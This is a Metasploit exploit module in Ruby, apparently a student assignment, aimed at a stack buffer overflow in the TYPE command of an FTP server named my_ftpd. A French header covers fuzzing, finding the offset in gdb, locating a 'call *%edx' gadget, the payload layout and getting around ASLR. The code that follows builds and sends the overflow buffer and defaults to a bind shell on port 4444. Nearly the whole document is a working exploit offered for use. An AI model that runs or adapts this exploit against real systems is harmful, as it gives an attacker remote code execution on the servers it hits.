=begin

  TATT - DM3 : Exploit Metasploit pour my_ftpd
  Auteur: Paul Berthelot (paul.berthelot@epita.fr)
  Promotion: SRS 2026

  =============================================================================
  ANALYSE DE LA VULNÉRABILITÉ
  =============================================================================

  Vulnérabilité : Buffer overflow dans la commande TYPE du serveur my_ftpd
  Déclenchement : Envoi d'un argument de longueur excessive à la commande TYPE
  Impact : Contrôle de l'adresse de retour et exécution de code arbitraire

  =============================================================================
  MÉTHODOLOGIE D'EXPLOITATION
  =============================================================================

  1. DÉCOUVERTE DE LA VULNÉRABILITÉ
     - Fuzzing automatique du serveur FTP avec différents payloads
     - Identification du crash sur la commande TYPE avec des buffers >= 500 octets

  2. ANALYSE AVEC GDB
     - Lancement du serveur avec gdb avec 'set follow-fork-mode child'
     - Reproduction du crash avec un cyclic pattern de 500 octets :
       msf-pattern_create -l 500

  3. DÉTERMINATION DE L'OFFSET
     - Segfault avec EIP = 0x69413669
     - Calcul de l'offset de contrôle :
       msf-pattern_offset -q 0x69413669
       [*] Exact match at offset 259

  4. ANALYSE DES REGISTRES
     - Au moment du crash, EDX pointe vers le début du buffer cyclique (offset 0)
     - Vérification avec : (gdb) x/100x $edx
     - EDX pointe sur notre buffer contrôlé

  5. RECHERCHE D'INSTRUCTION DE SAUT
     - Identification d'une instruction utilisant EDX :
       objdump -d my_ftpd | grep -E "(call.*edx|ff.*d2)"
     - Instruction trouvée : "call *%edx" à l'adresse 0x080493c2

  =============================================================================
  STRATÉGIE D'EXPLOITATION
  =============================================================================

  Structure du payload :
  [SHELLCODE] + [PADDING] + [ADRESSE_RETOUR]
      |             |            |
      |             |            +-- 0x080493c2 (call *%edx)
      |             +------------- 'A' * (259 - taille_shellcode)
      +--------------------------- Bind shell (port 4444)

  Fonctionnement :
  1. Le shellcode est placé au début du buffer (là où EDX pointe)
  2. Après 259 octets, l'adresse de retour est écrasée par 0x080493c2
  3. L'instruction "call *%edx" redirige l'exécution vers notre shellcode
  4. Exécution du shellcode: le bind shell s'ouvre sur le port 4444

  Cette technique fonctionne malgré l'ASLR car l'adresse 0x080493c2 se trouve
  dans le segment .text de l'exécutable principal, qui n'est pas  randomisé par
  l'ASLR.

  =============================================================================
  USAGE
  =============================================================================

  Utilisation de l'exploit avec Metasploit :

  cp 2ftp_exploit.rb ~/.msf4/modules/exploits/linux/ftp/

  msfconsole

  msf6 > use exploit/linux/ftp/2ftpexploit
  msf6 exploit(linux/ftp/2ftpexploit) > show options

  msf6 exploit(linux/ftp/2ftpexploit) > set RHOST 127.0.0.1
  msf6 exploit(linux/ftp/2ftpexploit) > set FTPUSER test
  msf6 exploit(linux/ftp/2ftpexploit) > set FTPPASS test

  msf6 exploit(linux/ftp/2ftpexploit) > exploit

=end

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MyFTPd TYPE Command Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack buffer overflow in the MyFTPd
        server. The flaw is triggered when a TYPE command is
        received with an overly-long argument.
      },
      'Author'         => [ 'Paul Berthelot <paul.berthelot@epita.fr>' ],
      'License'        => MSF_LICENSE,
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 259,
          'BadChars'    => "\x00\x0a\x0d\x20",
          'EncoderType' => Msf::Encoder::Type::AlphanumMixed,
          'DisableNops' => true,
        },
      'Platform'       => [ 'linux' ],
      'Arch'           => [ ARCH_X86 ],
      'Targets'        =>
        [
          [
            'MyFTPd Universal',
            {
              'Ret' => 0x080493c2,  # call *%edx
            },
          ],
        ],
      'DisclosureDate' => '2025-06-28',
      'DefaultTarget'  => 0,
      'DefaultOptions' => {
        'PAYLOAD' => 'linux/x86/shell_bind_tcp',
        'LPORT'   => 4444
      }))

    register_options([
      Opt::RPORT(21),
      OptString.new('FTPUSER', [true, 'FTP Username', 'test']),
      OptString.new('FTPPASS', [true, 'FTP Password', 'test'])
    ])
  end

  def exploit
    c = connect_login
    return if not c

    print_status("Trying target #{target.name}...")
    print_status("Using call *%edx at address 0x#{target.ret.to_s(16)}")

    begin
      shellcode = payload.encoded
      print_status("Generated shellcode size: #{shellcode.length} bytes")
    rescue ::Exception => e
      print_error("Payload generation failed: #{e.message}")
      return
    end

    offset = 259

    if shellcode.length >= (offset)
      print_error("Shellcode too large (#{shellcode.length} > #{offset - 10})")
      print_error("Try using a smaller payload or different encoder")
      return
    end

    # Construction du buffer
    buf = shellcode
    buf << "A" * (offset - shellcode.length)
    buf << [target.ret].pack('V')

    print_status("Total payload size: #{buf.length} bytes")
    print_status("Sending exploit...")

    # Envoi de l'exploit
    begin
      sock.put("TYPE #{buf}\r\n")
      select(nil, nil, nil, 2)  # wait 2 seconds

      print_good("Exploit sent successfully!")

      print_status("Starting payload handler...")
      handler

    rescue ::Exception => e
      print_error("Exploit failed: #{e.message}")
    ensure
      disconnect
    end
  end
end
